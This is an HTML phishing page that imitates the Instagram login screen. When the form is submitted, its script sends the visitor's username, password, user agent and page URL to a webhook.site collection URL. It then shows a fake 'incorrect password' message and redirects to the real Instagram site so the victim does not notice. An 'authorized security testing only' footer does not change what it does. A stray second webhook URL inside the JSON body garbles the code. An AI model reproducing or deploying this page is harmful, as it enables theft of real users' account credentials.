<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        .container { background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; max-width: 350px; width: 100%; }
        .logo { font-size: 36px; font-weight: 300; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 4px 0; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; font-size: 14px; outline: none; }
        input:focus { border-color: #a8a8a8; }
        button { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 4px; font-weight: 600; margin-top: 12px; cursor: pointer; font-size: 14px; }
        button:hover { background: #1877f2; }
        .error { color: #ed4956; font-size: 12px; margin-top: 8px; display: none; }
        .divider { margin: 20px 0; border-bottom: 1px solid #dbdbdb; }
        .footer { color: #8e8e8e; font-size: 12px; margin-top: 20px; max-width: 350px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" height="50" alt="Instagram"></div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required autofocus>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <div class="error" id="error">Sorry, your password was incorrect.</div>
        </form>
        <div class="divider"></div>
        <p style="color:#385185; font-size:14px; cursor:pointer;">Log in with Facebook</p>
        <p style="font-size:12px; margin-top:16px;"><a href="#" style="color:#00376b; text-decoration:none;">Forgot password?</a></p>
    </div>
    <div class="footer">Instagram clone for authorized security testing only</div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const error = document.getElementById('error');

            try {
                await fetch('https://webhook.site/REPLACE-WITH-YOUR-WEBHOOK-URL', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        username: username, https://webhook.site/4ae7aa6b-acad-4dfd-b6d9-870b74b067b5
                        password: password, 
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        page: window.location.href
                    })
                });
            } catch(err) {}

            error.style.display = 'block';
            setTimeout(() => { window.location.href = 'https://www.instagram.com'; }, 3000);
        });
    </script>
</body>
              </html>
